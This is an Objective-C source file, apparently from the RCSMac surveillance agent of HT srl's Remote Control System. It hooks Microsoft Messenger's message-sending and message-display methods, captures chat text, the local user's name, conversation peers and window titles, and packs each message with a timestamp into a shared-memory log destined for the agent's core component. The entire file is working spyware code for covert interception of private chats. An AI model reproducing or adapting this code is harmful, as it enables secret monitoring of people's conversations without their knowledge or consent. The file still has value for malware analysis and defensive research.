//
//  RCSMAgentIMMsnMessenger.m
//  RCSMac
//
//  Created by revenge on 4/15/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <objc/runtime.h>

#import "RCSMInputManager.h"
#import "RCSMAgentIMMsnMessenger.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


static NSString *gMyself            = nil;
static NSMutableString *gLoggedText = nil;
static BOOL gIsMe                   = NO;

void logMessage(NSString *message)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  NSString *_topic                = @"";
  NSData *topic                   = nil;
  NSString *_peers                = @"";
  NSData *peers                   = nil;
  NSDictionary *windowInfo        = nil;

  NSData *processName = [@"Microsoft Messenger" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
#ifdef DEBUG_IM_MESSENGER
      errorLog(@"No windowInfo found");
#endif
      topic = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      peers = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"windowName is empty");
#endif
          topic = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          peers = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
        }
      else
        {
          NSString *_windowName = [[windowInfo objectForKey: @"windowName"] copy];
#ifdef DEBUG_IM_MESSENGER
          infoLog(@"windowName: %@", _windowName);
#endif
          NSArray *splitString = nil;

          if ([_windowName isEqualToString: @"Contact List"] == NO)
            {
              if ([_windowName rangeOfString: @" - "].location != NSNotFound)
                {
                  splitString = [_windowName componentsSeparatedByString: @" - "];
                  _peers = [splitString objectAtIndex: 0];
                  _topic = [splitString objectAtIndex: 1];
                }
              else
                {
#ifdef DEBUG_IM_MESSENGER
                  errorLog(@"Token ' - ' not found in string (%@)", _windowName);
#endif
                }
            }

          NSMutableString *allPeers = [[NSMutableString alloc] init];
          if (gMyself != nil)
            {
#ifdef DEBUG_IM_MESSENGER
              infoLog(@"myself: %@", gMyself);
#endif
              [allPeers appendString: gMyself];
              if ([_peers isEqualToString: @""] == NO)
                {
                  [allPeers appendString: @", "];
                }
            }
          else
            {
#ifdef DEBUG_IM_MESSENGER
              errorLog(@"myself is empty");
#endif
            }

          [allPeers appendString: _peers];

#ifdef DEBUG_IM_MESSENGER
          infoLog(@"topic  : %@", _topic);
          infoLog(@"message: %@", message);
          infoLog(@"peers  : %@", allPeers);
#endif

          peers = [allPeers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          topic = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

          [allPeers release];
          [_windowName release];
        }
    }

  NSData *content             = [message dataUsingEncoding:
    NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Content
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];

#ifdef DEBUG_IM_MESSENGER
  verboseLog(@"entryData: %@", entryData);
#endif
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
#ifdef DEBUG_IM_MESSENGER
  verboseLog(@"logData: %@", logData);
#endif
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_MESSENGER
      verboseLog(@"message: %@", message);
#endif
    }
  else
    {
#ifdef DEBUG_IM_MESSENGER
      errorLog(@"Error while logging message to shared memory");
#endif
    }
  
  [logData release];
  [entryData release];
  [outerPool release];
}

@implementation myIMWindowController

- (void)SendMessageHook: (unichar *)arg1
                cchText: (NSUInteger)arg2
                 inHTML: (NSString *)arg3
{
#ifdef DEBUG_IM_MESSENGER
  infoLog(@"");
#endif

  if (gMyself == nil)
    {
      gIsMe = YES;
    }
  else
    {
#ifdef DEBUG_IM_MESSENGER
      warnLog(@"myself is not nil: %@", gMyself);
#endif
    }

  [self SendMessageHook: arg1
                cchText: arg2
                 inHTML: arg3];
}

@end

@implementation myIMWebViewController

- (void)ParseAndAppendUnicodeHook: (unichar *)arg1
                         inLength: (uint16_t)arg2
                          inStyle: (int)arg3
                          fIndent: (unsigned char)arg4
                  fParseEmoticons: (unsigned char)arg5
                       fParseURLs: (unsigned char)arg6
                     inSenderName: (int)arg7
                       fLocalUser: (CFStringRef)arg8
{
  [self ParseAndAppendUnicodeHook: arg1
                         inLength: arg2
                          inStyle: arg3
                          fIndent: arg4
                  fParseEmoticons: arg5
                       fParseURLs: arg6
                     inSenderName: arg7
                       fLocalUser: arg8];

  NSString *message = [[NSString alloc] initWithCharacters: (unichar *)arg1
                                                    length: arg2];

  if ([message rangeOfString: @"says"].location != NSNotFound)
    {
      // <username> says:    <-- is being written to view
      if (gLoggedText == nil)
        {
          gLoggedText = [[NSMutableString alloc] init];
          NSString *peer = [[message componentsSeparatedByString: @" "] objectAtIndex: 0];
          if (gIsMe == YES && gMyself == nil)
            {
              gIsMe = NO;
              gMyself = [[NSString alloc] initWithString: peer];

#ifdef DEBUG_IM_MESSENGER
              infoLog(@"myself: %@", peer);
#endif
            }
          [gLoggedText appendFormat: @"%@: ", peer];

#ifdef DEBUG_IM_MESSENGER
          infoLog(@"1step log: %@", gLoggedText);
#endif
        }
      else
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in says");
#endif
        }
    }
  else if ([message rangeOfString: @"added to the conversation"].location != NSNotFound)
    {
      // <username> has been added to the conversation
      if (gLoggedText == nil)
        {
          gLoggedText = [[NSMutableString alloc] init];
          [gLoggedText appendString: message];
          logMessage(gLoggedText);
          [gLoggedText release];
          gLoggedText = nil;
        }
      else
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in add contact to multichat");
#endif
        }
    }
  else
    {
      // <message>    <-- aka real message is being written to view
      if (gLoggedText == nil)
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in message");
#endif
        }
      else
        {
#ifdef DEBUG_IM_MESSENGER
          infoLog(@"Appending: %@", message);
#endif
          [gLoggedText appendString: message];
          logMessage(gLoggedText);
          [gLoggedText release];
          gLoggedText = nil;
        }
    }

  [message release];
}

@end
